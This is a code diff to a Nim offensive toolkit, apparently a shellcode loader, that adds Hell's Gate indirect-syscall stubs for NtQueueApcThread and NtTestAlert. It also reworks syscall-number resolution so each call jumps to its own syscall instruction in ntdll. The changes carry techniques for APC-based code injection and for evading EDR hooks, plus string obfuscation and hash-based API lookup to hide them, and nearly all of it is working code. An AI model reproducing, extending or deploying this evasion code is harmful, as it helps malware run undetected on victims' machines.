@@ -116,6 +116,39 @@ var
 
 """
 
+let HellsgateNtQueueApcThreadDelegate* = """
+
+proc NtQueueApcThread(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall`
+        mov r11, `syscallJumpAddress`
+        jmp r11
+        ret
+    ===
+
+var
+    ntQueueApcThreadfuncHash        : uint64            = djb2_hash(obf("NtQueueApcThread"))
+    ntQueueApcThreadTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntQueueApcThreadfuncHash)
+
+"""
+
+let HellsgateNtTestAlertDelegate*  = """
+
+proc NtTestAlert(): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov eax, `syscall`
+        mov r11, `syscallJumpAddress`
+        jmp r11
+        ret
+    ===
+
+var
+    ntTestAlertfuncHash        : uint64            = djb2_hash(obf("NtTestAlert"))
+    ntTestAlertTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntTestAlertfuncHash)
+
+"""
+
 
 let HellsgateNtCreateThreadExDelegate*  = """
 
@@ -445,7 +478,8 @@ when defined(Hellsgate):
             pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
             pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
             pAddrOfOrdinals     : ptr UncheckedArray[WORD]  = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)
-    
+        
+        var foundFuncAddr: PVOID
         while cx < numFuncs:    
             var 
                 pFuncOrdinal    : WORD      = pAddrOfOrdinals[cx]
@@ -460,7 +494,8 @@ when defined(Hellsgate):
                 # Not hooked API
                 if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                     tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
-                    return true
+                    foundFuncAddr = pFuncAddr
+                    break
                 # Credit: https://github.com/Haunted-Banshee/ErebusGate/blob/main/ErebusGate.nim
                 # Classic hook API 
                 # Check the the first byte is 0xe9
@@ -468,22 +503,39 @@ when defined(Hellsgate):
                     for idx in countup(1,500):
                         if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * UP)[] == 0xB8:
                             tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * UP))[] + cast[WORD](idx)
-                            return true
+                            foundFuncAddr = pFuncAddr
+                            break
                         if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * DOWN)[] == 0xB8:
                             tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * DOWN))[] - cast[WORD](idx)
-                            return true 
+                            foundFuncAddr = pFuncAddr
+                            break
                 # Tartarus gate from Nim
                 # Check the the third is 0xe9
                 elif cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 )[] == 0xE9:
                     for idx in countup(1,500):
                         if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * UP)[] == 0xB8:
                             tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * UP))[] + cast[WORD](idx)
-                            return true
+                            foundFuncAddr = pFuncAddr
+                            break
                         if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * DOWN)[] == 0xB8:
                             tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * DOWN))[] - cast[WORD](idx)
-                            return true
+                            foundFuncAddr = pFuncAddr
+                            break
             inc cx
-        return false
+        
+        if cx >= numFuncs:
+            return false
+        
+        var offset: UINT = 0
+        while true:
+            var currByte = cast[PDWORD](foundFuncAddr + offset)[]
+            if obf("050F0375") in $currByte.toHex:
+                when defined(verbose):
+                    echo obf("[*] Found corresponding syscall instruction in ntdll addr ") & $cast[ByteAddress](foundFuncAddr + offset).toHex & obf(": ") & $currByte.toHex
+                syscallJumpAddress = cast[ByteAddress](foundFuncAddr + offset) + sizeof(WORD)
+                return true
+            offset = offset + 1
+
     
     proc GetPEBAsm64(): PPEB {.asmNoStackFrame.} =
         asm ===
@@ -491,6 +543,7 @@ when defined(Hellsgate):
             ret
         ===
     
+    #[
     # Credit: https://github.com/eversinc33/BouncyGate/blob/main/HellsGate.nim
     proc getSyscallInstructionAddress(ntdllModuleBaseAddr: PVOID): ByteAddress =
         ## Get The address of a syscall instruction from ntdll to make sure all syscalls go through ntdll
@@ -515,7 +568,7 @@ when defined(Hellsgate):
         when defined(verbose):
             echo obf("[!] Did not find a syscall instruction in ntdll...")
         quit(1)
-
+    ]#
     proc getNextModule(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
         flink = flink.Flink[]
         return flinkToModule(flink)
@@ -538,8 +591,9 @@ when defined(Hellsgate):
                 if beginModule == currModule:
                     break
                 continue
-            if obf("ntdll") in moduleName.toLower():
-                syscallJumpAddress = getSyscallInstructionAddress(currModule.DLLBase)
+            # Not needed anymore, as we are now jumping to the corresponding syscall in ntdll.dll instead of the first one
+            #if obf("ntdll") in moduleName.toLower():
+            #    syscallJumpAddress = getSyscallInstructionAddress(currModule.DLLBase)
             
             if not getExportTable(currModule, pExportTable):
                 when defined(verbose):
